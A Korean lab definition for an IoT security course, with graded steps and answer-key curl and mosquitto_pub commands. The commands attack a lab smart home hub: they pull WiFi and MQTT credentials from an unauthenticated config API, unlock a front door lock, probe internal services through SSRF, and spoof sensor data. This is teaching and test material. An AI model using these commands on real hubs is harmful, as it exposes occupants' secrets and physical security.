lab_id: iot-security-nonai-week10
title: 스마트홈 보안
version: non-ai
course: iot-security-nonai
week: 10
description: 스마트홈 허브 API 공격, 디바이스 제어, 프로토콜 분석을 수행합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 스마트홈 허브의 API를 분석하고 취약점을 발견한다
- 미인증 API로 디바이스를 제어한다
- 스마트홈 보안 아키텍처를 설계한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 스마트홈 허브 API(8090)에서 디바이스 목록을 수집하시오.
  hint: curl http://10.20.30.80:8090/api/devices를 사용하세요.
  category: recon
  points: 10
  answer: curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool 2>/dev/null | head -15; echo '디바이스 목록 수집 완료'
  answer_detail: 미인증 API에서 전체 디바이스 목록과 상태 정보를 수집할 수 있습니다.
  verify:
    type: output_contains
    expect: 디바이스 목록 수집 완료
    field: stdout
  target_vm: attacker
- order: 2
  instruction: 허브 설정 정보(/api/config)에서 민감 데이터를 추출하시오.
  hint: WiFi 비밀번호, MQTT 인증 정보, API 키를 확인하세요.
  category: data_leak
  points: 12
  answer: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; echo '설정 정보 수집 완료'
  answer_detail: 설정 API에서 WiFi 비밀번호, MQTT 인증 정보, 클라우드 API 키 등이 노출됩니다.
  verify:
    type: output_contains
    expect: 설정 정보 수집 완료
    field: stdout
  target_vm: attacker
- order: 3
  instruction: API를 통해 현관 도어락(lock_front)을 해제하시오.
  hint: POST /api/devices/lock_front/control에 action:unlock을 전송하세요.
  category: attack
  points: 12
  answer: curl -s -X POST http://10.20.30.80:8090/api/devices/lock_front/control -H 'Content-Type:application/json' -d '{"action":"unlock"}' 2>/dev/null; echo 'API 도어락 해제 완료'
  answer_detail: 인증 없는 API로 도어락을 해제할 수 있으면 물리적 보안 위협이 됩니다.
  verify:
    type: output_contains
    expect: API 도어락 해제 완료
    field: stdout
  target_vm: attacker
- order: 4
  instruction: SSRF 취약점을 이용하여 내부 서비스를 스캔하시오.
  hint: /api/webhook/test?url=http://내부IP 형식을 사용하세요.
  category: attack
  points: 10
  answer: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null | head -5; echo 'SSRF 테스트 완료'
  answer_detail: SSRF(Server-Side Request Forgery)로 허브에서 내부 서비스에 접근할 수 있습니다.
  verify:
    type: output_contains
    expect: SSRF 테스트 완료
    field: stdout
  target_vm: attacker
- order: 5
  instruction: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입하시오.
  hint: mosquitto_pub으로 센서 토픽에 메시지를 발행하세요.
  category: mqtt
  points: 10
  answer: mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state' -m '{"value":-30,"unit":"C"}' 2>/dev/null && echo 'MQTT 데이터 주입 완료'
  answer_detail: MQTT 미인증 접근으로 센서 데이터를 조작하면 자동화 규칙이 오동작할 수 있습니다.
  verify:
    type: output_contains
    expect: MQTT 데이터 주입 완료
    field: stdout
  target_vm: attacker
- order: 6
  instruction: 스마트홈 보안 아키텍처를 설계하시오. VLAN 분리, API 인증, 암호화를 포함하시오.
  hint: 네트워크, 인증, 암호화 각 계층의 대책을 정리하세요.
  category: verification
  points: 10
  answer: echo '=== 스마트홈 보안 아키텍처 ===' && echo '[네트워크] IoT 전용 VLAN + 방화벽' && echo '[인증] API JWT 토큰 + RBAC' && echo '[암호화] MQTT TLS + HTTPS' && echo '[모니터링] 이상 행위 탐지' && echo '[물리] 허브 잠금 보관' && echo '=== 아키텍처 설계 완료 ==='
  answer_detail: 스마트홈 보안은 다층 방어(Defense in Depth) 전략을 적용해야 합니다.
  verify:
    type: output_contains
    expect: 아키텍처 설계 완료
    field: stdout
  target_vm: attacker
